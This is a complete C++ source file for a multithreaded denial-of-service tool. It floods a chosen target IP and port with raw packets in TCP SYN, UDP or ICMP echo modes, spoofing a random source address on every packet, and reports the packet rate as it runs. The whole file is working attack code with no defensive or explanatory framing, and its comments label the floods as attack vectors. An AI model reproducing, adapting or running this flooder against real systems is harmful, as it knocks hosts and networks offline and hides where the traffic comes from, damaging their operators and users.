#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <random>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>

// Thread-safe global counter for cross-platform speed tracking
std::atomic<uint64_t> total_packets(0);
std::atomic<bool> keep_running(true);

// High-speed random number engine per execution thread
thread_local std::mt19937 generator(std::random_device{}());

uint32_t generate_random_ip() {
    std::uniform_int_distribution<uint32_t> dist(1, 254);
    return (dist(generator) << 24) | (dist(generator) << 16) | (dist(generator) << 8) | dist(generator);
}

uint16_t generate_random_port() {
    std::uniform_int_distribution<uint16_t> dist(1024, 65535);
    return dist(generator);
}

// Standard Internet Checksum computation for IP/TCP/ICMP compliance
uint16_t calculate_checksum(uint16_t *addr, int count) {
    long sum = 0;
    while (count > 1) {
        sum += ntohs(*addr++);
        count -= 2;
    }
    if (count > 0) {
        sum += *(uint8_t *)addr;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return htons((uint16_t)(~sum));
}

// --- ATTACK VECTOR 1: HIGH SPEED TCP SYN FLOOD ---
void tcp_syn_flood(std::string target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);

    char datagram[4096];
    std::memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));

    // Pre-build structural defaults outside the loop to optimize performance
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->daddr = sin.sin_addr.s_addr;

    tcph->dest = htons(target_port);
    tcph->doff = 5;
    tcph->syn = 1; // Explicitly toggle the SYN handshake flag
    tcph->window = htons(5840);

    while (keep_running) {
        iph->id = htons(generate_random_port());
        iph->saddr = generate_random_ip(); // Source IP Spoofing
        tcph->source = htons(generate_random_port());
        tcph->seq = htonl(generate_random_ip());

        iph->check = 0;
        iph->check = calculate_checksum((uint16_t *)datagram, iph->tot_len);

        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        total_packets++;
    }
    close(sock);
}

// --- ATTACK VECTOR 2: HIGH VOLUME RAW UDP FLOOD ---
void udp_flood(std::string target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);

    char datagram[4096];
    std::memset(datagram, 0, 4096);

    int payload_size = 512; // Modest size payload to strain maximum link saturation
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    char *data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
    std::memset(data, 'A', payload_size);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->daddr = sin.sin_addr.s_addr;

    udph->dest = htons(target_port);
    udph->len = htons(sizeof(struct udphdr) + payload_size);

    while (keep_running) {
        iph->id = htons(generate_random_port());
        iph->saddr = generate_random_ip();
        udph->source = htons(generate_random_port());

        iph->check = 0;
        iph->check = calculate_checksum((uint16_t *)datagram, iph->tot_len);

        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        total_packets++;
    }
    close(sock);
}

// --- ATTACK VECTOR 3: LINEAR ICMP PING FLOOD ---
void icmp_flood(std::string target_ip) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);

    char datagram[4096];
    std::memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *)datagram;
    struct icmphdr *icmph = (struct icmphdr *)(datagram + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
    iph->ttl = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->daddr = sin.sin_addr.s_addr;

    icmph->type = ICMP_ECHO; // Force echo-request evaluation cycle
    icmph->code = 0;

    while (keep_running) {
        iph->id = htons(generate_random_port());
        iph->saddr = generate_random_ip();
        icmph->un.echo.id = htons(generate_random_port());
        icmph->un.echo.sequence = htons(generate_random_port());

        icmph->checksum = 0;
        icmph->checksum = calculate_checksum((uint16_t *)icmph, sizeof(struct icmphdr));
        iph->check = 0;
        iph->check = calculate_checksum((uint16_t *)datagram, iph->tot_len);

        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        total_packets++;
    }
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        std::cout << "Usage: " << argv[0] << " <IP> <PORT> <THREADS> <MODE: tcp/udp/icmp>" << std::endl;
        return 1;
    }

    std::string target_ip = argv[1];
    int target_port = std::stoi(argv[2]);
    int thread_count = std::stoi(argv[3]);
    std::string mode = argv[4];

    std::cout << "=================================================================" << std::endl;
    std::cout << "[*] COMPILED C++ PIPELINE INITIATED -> " << target_ip << ":" << target_port << std::endl;
    std::cout << "[*] Attack Vector Mode : " << mode << " | Working Concurrency: " << thread_count << " threads" << std::endl;
    std::cout << "[*] Status             : Injecting high-volume traffic into network interface..." << std::endl;
    std::cout << "=================================================================" << std::endl;

    std::vector<std::thread> workers;
    
    // Spawn dedicated execution workers based on user command selections
    for (int i = 0; i < thread_count; ++i) {
        if (mode == "tcp") {
            workers.push_back(std::thread(tcp_syn_flood, target_ip, target_port));
        } else if (mode == "udp") {
            workers.push_back(std::thread(udp_flood, target_ip, target_port));
        } else if (mode == "icmp") {
            workers.push_back(std::thread(icmp_flood, target_ip));
        }
    }

    auto start_time = std::chrono::high_resolution_clock::now();

    // Telemetry reporting loop running on the master process thread
    try {
        while (keep_running) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            auto current_time = std::chrono::high_resolution_clock::now();
            std::chrono::duration<double> elapsed = current_time - start_time;
            
            uint64_t current_count = total_packets.load();
            uint64_t pps = (elapsed.count() > 0) ? (current_count / elapsed.count()) : 0;

            std::cout << "\r[+] Outbound Multi-Vector Rate: " << pps << " packets/sec | Aggregated Dispatched: " << current_count << std::flush;
        }
    } catch (...) {
        keep_running = false;
    }

    keep_running = false;
    for (auto &t : workers) {
        if (t.joinable()) t.join();
    }
    return 0;
}
